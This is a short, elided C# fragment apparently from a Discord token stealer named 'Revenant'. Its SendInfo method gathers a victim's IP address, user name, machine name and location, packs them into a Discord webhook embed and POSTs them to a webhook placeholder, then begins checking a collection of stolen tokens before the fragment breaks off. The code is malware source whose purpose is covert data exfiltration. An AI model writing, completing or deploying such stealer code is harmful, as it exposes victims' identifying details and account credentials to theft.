...
namespace Program
{
    static class Program
    {
        ...
        static void SendInfo()
        {
            try
            {
                Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Revenant | " + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") + "\"},\"author\":{\"name\":\"Revenant\",\"url\":\"https://github.com/rootuwu\"},\"fields\":[{\"name\":\"IP Address\",\"value\":\"" + IP() + "\"},{\"name\":\"User Name\",\"value\":\"" + Environment.UserName + "\"},{\"name\":\"Machine Name\",\"value\":\"" + Environment.MachineName + "\"},{\"name\":\"Location\",\"value\":\"" + Location() + "\"}]}],\"content\":\"\",\"username\":\"Revenant\"}");
                if (tokens.Count != 0)
                {
